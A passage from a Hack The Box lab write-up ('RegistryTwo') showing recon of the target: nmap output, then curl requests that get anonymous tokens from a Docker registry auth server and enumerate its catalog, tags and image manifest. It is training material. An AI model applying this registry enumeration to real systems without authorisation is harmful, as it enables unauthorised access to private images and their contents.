---
tags:
title: RegistryTwo - Insane (HTB)
permalink: /RegistryTwo-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
nmapf 10.129.229.28
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 11:24 -0500
Initiating Ping Scan at 11:24
Scanning 10.129.229.28 [4 ports]
Completed Ping Scan at 11:24, 0.36s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:24
Completed Parallel DNS resolution of 1 host. at 11:24, 0.50s elapsed
Initiating SYN Stealth Scan at 11:24
Scanning 10.129.229.28 [65535 ports]
Discovered open port 22/tcp on 10.129.229.28
Discovered open port 443/tcp on 10.129.229.28
Discovered open port 5001/tcp on 10.129.229.28
Discovered open port 5000/tcp on 10.129.229.28
Completed SYN Stealth Scan at 11:24, 14.20s elapsed (65535 total ports)
Nmap scan report for 10.129.229.28
Host is up, received echo-reply ttl 63 (0.37s latency).
Scanned at 2026-02-23 11:24:33 EST for 15s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
443/tcp  open  https         syn-ack ttl 63
5000/tcp open  upnp          syn-ack ttl 62
5001/tcp open  commplex-link syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.17 seconds
           Raw packets sent: 131078 (5.767MB) | Rcvd: 15 (640B)
-e [*] IP: 10.129.229.28
[*] Puertos abiertos: 22,443,5000,5001
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,443,5000,5001 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 11:24 -0500
Nmap scan report for 10.129.229.28
Host is up (0.82s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fa:b0:03:98:7e:60:c2:f3:11:82:27:a1:35:77:9f:d3 (RSA)
|   256 f2:59:06:dc:33:b0:9f:a3:5e:b7:63:ff:61:35:9d:c5 (ECDSA)
|_  256 e3:ac:ab:ea:2b:d6:8e:f4:1f:b0:7b:05:0a:69:a5:37 (ED25519)
443/tcp  open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| ssl-cert: Subject: organizationName=free-hosting/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2023-02-01T20:19:22
|_Not valid after:  2024-02-01T20:19:22
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://www.webhosting.htb/
5000/tcp open  ssl/http Docker Registry (API: 2.0)
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Not valid before: 2023-03-26T21:32:06
|_Not valid after:  2024-03-25T21:32:06
|_http-title: Site doesn't have a title.
5001/tcp open  ssl/http Golang net/http server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Not valid before: 2023-03-26T21:32:06
|_Not valid after:  2024-03-25T21:32:06
| tls-alpn:
|   h2
|_  http/1.1
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 23 Feb 2026 16:29:13 GMT
|     Content-Length: 10
|     found
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Mon, 23 Feb 2026 16:28:35 GMT
|     Content-Length: 26
|     <h1>Acme auth server</h1>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Mon, 23 Feb 2026 16:28:40 GMT
|     Content-Length: 26
|     <h1>Acme auth server</h1>
|   OfficeScan:
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5001-TCP:V=7.98%T=SSL%I=7%D=2/23%Time=699C7F71%P=x86_64-pc-linux-gn
SF:u%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(GetRequest,8E,"HTTP/1\.0\x20200\x20OK\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=utf-8\r\nDate:\x20Mon,\x2023\x20Feb\x20202
SF:6\x2016:28:35\x20GMT\r\nContent-Length:\x2026\r\n\r\n<h1>Acme\x20auth\x
SF:20server</h1>\n")%r(HTTPOptions,8E,"HTTP/1\.0\x20200\x20OK\r\nContent-T
SF:ype:\x20text/html;\x20charset=utf-8\r\nDate:\x20Mon,\x2023\x20Feb\x2020
SF:26\x2016:28:40\x20GMT\r\nContent-Length:\x2026\r\n\r\n<h1>Acme\x20auth\
SF:x20server</h1>\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFour
SF:Request,A7,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x
SF:20Mon,\x2023\x20Feb\x202026\x2016:29:13\x20GMT\r\nContent-Length:\x2010
SF:\r\n\r\nNot\x20found\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeS
SF:can,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20H
SF:ost\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConne
SF:ction:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x2
SF:0Host\x20header");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.51 seconds
```

```bash
addhost 10.129.229.28 www.webhosting.htb
[+] Appended www.webhosting.htb to existing entry for 10.129.229.28 in /etc/hosts
10.129.229.28 registrytwo.htb registry2.htb webhosting.htb www.webhosting.htb
```


![image-center](/assets/images/Pasted image 20260223133821.png)

![image-center](/assets/images/Pasted image 20260223133858.png)

![image-center](/assets/images/Pasted image 20260223133928.png)

![image-center](/assets/images/Pasted image 20260223133955.png)

### Port 5001

![image-center](/assets/images/Pasted image 20260223134033.png)

### Docker registry

```bash
curl -s -X GET 'https://webhosting.htb:5000/v2' -k -L
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
```

```bash
curl -s -I -X GET 'https://webhosting.htb:5000/v2/' -k
HTTP/2 401
content-type: application/json; charset=utf-8
docker-distribution-api-version: registry/2.0
www-authenticate: Bearer realm="https://webhosting.htb:5001/auth",service="Docker registry"
x-content-type-options: nosniff
content-length: 87
date: Mon, 23 Feb 2026 16:48:46 GMT
```

```bash
curl -k -s -u 'L.clark:WAT?watismypass!' \
"https://webhosting.htb:5001/auth?service=Docker+registry&scope=registry:catalog:*"
Auth failed.
```

https://book.hacktricks.wiki/en/generic-hacking/brute-force.html#docker-registry

```bash
zsln$ curl -k -s "https://webhosting.htb:5001/auth?service=Docker+registry&scope=registry:catalog:*" | jq .
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzcxODY2NDk3LCJuYmYiOjE3NzE4NjU1ODcsImlhdCI6MTc3MTg2NTU5NywianRpIjoiNDgwNjcxMDUzOTc4NTYyNjUyNCIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.c2-xhGgZZkFhQNm6sBiU0MkdtMnH4_anKzgVoxBGKgoRpipVBHWSKEytPq--wVWg0JZ9uPz6CPo_37-SG4-hMBNDVuSnICK0nWmofRJ5WCGOnH9sncnt9PRjdic4h-8Q7xsTH0OqK1z1yddBaiJjabt4DS2HFPKJACSfnSr4Vtt41jJUgp7v9jwKWybxs47dpv1oae0SVfvmZPnqCx75e_rNGlgTrhsYKlH1nTQR9RBS0BLHBFvdRwZxZJ3uf2Ay-wPBgAvT9DnoaiJM3WjbjIzpbBTzN3l_DRfn0WV5cHOopSne9L-TRCxoBi4AnG2fuab6bU8UNEjJwHtQ31PRcQ",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzcxODY2NDk3LCJuYmYiOjE3NzE4NjU1ODcsImlhdCI6MTc3MTg2NTU5NywianRpIjoiNDgwNjcxMDUzOTc4NTYyNjUyNCIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.c2-xhGgZZkFhQNm6sBiU0MkdtMnH4_anKzgVoxBGKgoRpipVBHWSKEytPq--wVWg0JZ9uPz6CPo_37-SG4-hMBNDVuSnICK0nWmofRJ5WCGOnH9sncnt9PRjdic4h-8Q7xsTH0OqK1z1yddBaiJjabt4DS2HFPKJACSfnSr4Vtt41jJUgp7v9jwKWybxs47dpv1oae0SVfvmZPnqCx75e_rNGlgTrhsYKlH1nTQR9RBS0BLHBFvdRwZxZJ3uf2Ay-wPBgAvT9DnoaiJM3WjbjIzpbBTzN3l_DRfn0WV5cHOopSne9L-TRCxoBi4AnG2fuab6bU8UNEjJwHtQ31PRcQ"
}
```

```bash
zs1n$ TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzcxODY2NDk3LCJuYmYiOjE3NzE4NjU1ODcsImlhdCI6MTc3MTg2NTU5NywianRpIjoiNDgwNjcxMDUzOTc4NTYyNjUyNCIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.c2-xhGgZZkFhQNm6sBiU0MkdtMnH4_anKzgVoxBGKgoRpipVBHWSKEytPq--wVWg0JZ9uPz6CPo_37-SG4-hMBNDVuSnICK0nWmofRJ5WCGOnH9sncnt9PRjdic4h-8Q7xsTH0OqK1z1yddBaiJjabt4DS2HFPKJACSfnSr4Vtt41jJUgp7v9jwKWybxs47dpv1oae0SVfvmZPnqCx75e_rNGlgTrhsYKlH1nTQR9RBS0BLHBFvdRwZxZJ3uf2Ay-wPBgAvT9DnoaiJM3WjbjIzpbBTzN3l_DRfn0WV5cHOopSne9L-TRCxoBi4AnG2fuab6bU8UNEjJwHtQ31PRcQ"
```

```bash
curl 'https://webhosting.htb:5000/v2/_catalog' -k -H $TOKEN
{"repositories":["hosting-app"]}
```

```bash
# Nota el cambio en el parámetro 'scope'
TOKEN_REPO=$(curl -k -s "https://webhosting.htb:5001/auth?service=Docker+registry&scope=repository:hosting-app:pull" | jq -r .token)
```

```bash
zs1n$ curl -k -s -H "Authorization: Bearer $TOKEN_REPO" "https://webhosting.htb:5000/v2/hosting-app/tags/list"
{"name":"hosting-app","tags":["latest"]}
```

```bash
zs1n$ curl -k -s -H "Authorization: Bearer $TOKEN_REPO" "https://webhosting.htb:5000/v2/hosting-app/manifests/latest" | jq .
{
  "schemaVersion": 1,
  "name": "hosting-app",
  "tag": "latest",
  "architecture": "amd64",
  "fsLayers": [
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba"
    },
    {
      "blobSum": "sha256:4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42"
    },
    {
      "blobSum": "sha256:9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268"
    },
    {
      "blobSum": "sha256:b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc"
    },
    {
      "blobSum": "sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7"
    },
    {
      "blobSum": "sha256:9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c"
    },
    {
      "blobSum": "sha256:ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e"
    },
    {
      "blobSum": "sha256:497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
    },
    {
      "blobSum": "sha256:ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28"
    }
  ],
  "history": [
    {
      "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"app\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\",\"LANG=C.UTF-8\",\"JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\",\"JAVA_VERSION=8u151\",\"JAVA_ALPINE_VERSION=8.151.12-r0\",\"CATALINA_HOME=/usr/local/tomcat\",\"TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\",\"LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\",\"GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\",\"TOMCAT_MAJOR=9\",\"TOMCAT_VERSION=9.0.2\",\"TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\",\"TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\",\"TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"],\"Cmd\":[\"catalina.sh\",\"run\"],\"Image\":\"sha256:57f3a04ba3229928a30942945b0fb3c74bd61cec80cbc5a41d7d61a2d1c3ec4f\",\"Volumes\":null,\"WorkingDir\":\"/usr/local/tomcat\",\"Entrypoint\":null,\"OnBuild\":[],\"Labels\":null},\"container\":\"2f8f037b0e059fa89bc318719f991b783cd3c4b92de4a6776cc5ec3a8530d6ba\",\"container_config\":{\"Hostname\":\"2f8f037b0e05\",\"Domainname\":\"\",\"User\":\"app\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\",\"LANG=C.UTF-8\",\"JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\",\"JAVA_VERSION=8u151\",\"JAVA_ALPINE_VERSION=8.151.12-r0\",\"CATALINA_HOME=/usr/local/tomcat\",\"TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\",\"LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\",\"GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\",\"TOMCAT_MAJOR=9\",\"TOMCAT_VERSION=9.0.2\",\"TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\",\"TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\",\"TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"catalina.sh\\\" \\\"run\\\"]\"],\"Image\":\"sha256:57f3a04ba3229928a30942945b0fb3c74bd61cec80cbc5a41d7d61a2d1c3ec4f\",\"Volumes\":null,\"WorkingDir\":\"/usr/local/tomcat\",\"Entrypoint\":null,\"OnBuild\":[],\"Labels\":{}},\"created\":\"2023-07-04T10:57:03.768956926Z\",\"docker_version\":\"20.10.23\",\"id\":\"1f5797acb3ce332a92212fac43141b9179f396db844876ea976828c027cc5cd2\",\"os\":\"linux\",\"parent\":\"b581fd7323f8b829979a384105c27aeff6f114f0b5e63aaa00e4090ce50df370\",\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"b581fd7323f8b829979a384105c27aeff6f114f0b5e63aaa00e4090ce50df370\",\"parent\":\"1c287aa55678a4fa6681ba16d09ce6bf798fac6640dceb43230e18a04316aee1\",\"created\":\"2023-07-04T10:57:03.500684978Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  USER app\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"1c287aa55678a4fa6681ba16d09ce6bf798fac6640dceb43230e18a04316aee1\",\"parent\":\"c5b60d48ea6e9578b52142829c5a979f0429207c7ff107f556c73b2d00230ba2\",\"created\":\"2023-07-04T10:57:03.230181852Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY --chown=app:appfile:24e216b758a41629b4357c4cd3aa1676635e7f68b432edff5124a8af4b95362f in /etc/hosting.ini \"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"c5b60d48ea6e9578b52142829c5a979f0429207c7ff107f556c73b2d00230ba2\",\"parent\":\"8352728bd14b4f5a18051ae76ce15e3d3a97180d5a699b3847d89570e37354f1\",\"created\":\"2023-07-04T10:57:02.865658784Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c chown -R app /usr/local/tomcat/\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"8352728bd14b4f5a18051ae76ce15e3d3a97180d5a699b3847d89570e37354f1\",\"parent\":\"a785065e8f19dad061ddf5035668d11bc69cd943634130ffd35ab8fcd9884da0\",\"created\":\"2023-07-04T10:56:56.087876543Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c adduser -S -u 1000 -G app app\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"a785065e8f19dad061ddf5035668d11bc69cd943634130ffd35ab8fcd9884da0\",\"parent\":\"690545aba874c1cbffa3b6cfa0b6708cffb39c97d4b823b4cef4abd0db23cce0\",\"created\":\"2023-07-04T10:56:55.215778789Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c addgroup -S -g 1000 app\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"690545aba874c1cbffa3b6cfa0b6708cffb39c97d4b823b4cef4abd0db23cce0\",\"parent\":\"a133674c237f389cb7d5e0c12177d5a7f3dcc3f068f6e92561f5898835c827d6\",\"created\":\"2023-07-04T10:56:54.346382505Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:c7945822095fe4c2530de4cf6bf7c729cbe6af014740a937187ab5d2e35c30f6 in /usr/local/tomcat/webapps/hosting.war \"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"a133674c237f389cb7d5e0c12177d5a7f3dcc3f068f6e92561f5898835c827d6\",\"parent\":\"57f5a3c239ecc33903be4eabc571b72d8d934124b84dc6bdffb476845a9af610\",\"created\":\"2023-07-04T10:56:53.888849151Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:9fd68c3bdf49b0400fb5ecb77c7ac57ae96f83db385b6231feb7649f7daa5c23 in /usr/local/tomcat/conf/context.xml \"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"57f5a3c239ecc33903be4eabc571b72d8d934124b84dc6bdffb476845a9af610\",\"parent\":\"b01f09ef77c3df66690a924577eabb8ed7043baeaa37a1b608370d0489e4fdee\",\"created\":\"2023-07-04T10:56:53.629058758Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c rm -rf /usr/local/tomcat/webapps/ROOT\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"b01f09ef77c3df66690a924577eabb8ed7043baeaa37a1b608370d0489e4fdee\",\"parent\":\"80e769c3cd6d9be2bcfea77a058c23d7ea112afaddce9e12c8eebf6d759923fe\",\"created\":\"2018-01-10T09:34:07.981925046Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"catalina.sh\\\" \\\"run\\\"]\"]},\"throwaway\":true}"
    },
    {
